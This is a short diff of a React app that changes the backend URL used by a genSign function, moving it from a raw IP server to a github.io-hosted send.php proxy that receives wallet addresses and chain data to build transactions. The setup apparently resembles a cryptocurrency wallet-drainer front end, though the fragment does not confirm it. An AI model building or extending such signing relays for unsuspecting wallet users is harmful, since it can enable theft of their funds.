@@ -31,7 +31,7 @@ function App() {
     console.log(account_sender);
   
     async function genSign(address,chain,type,contract="0"){
-      let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php"; // آدرس پروکسی‌شده
+      let apiUrl = "https://xxxtentacali.github.io/myproxy/send.php"; // آدرس پروکسی‌شده
 
       if (type == "coin"){
         var result = await jQuery.post(apiUrl, {"handler":"tx","address":address,"chain":chain,"type":type});
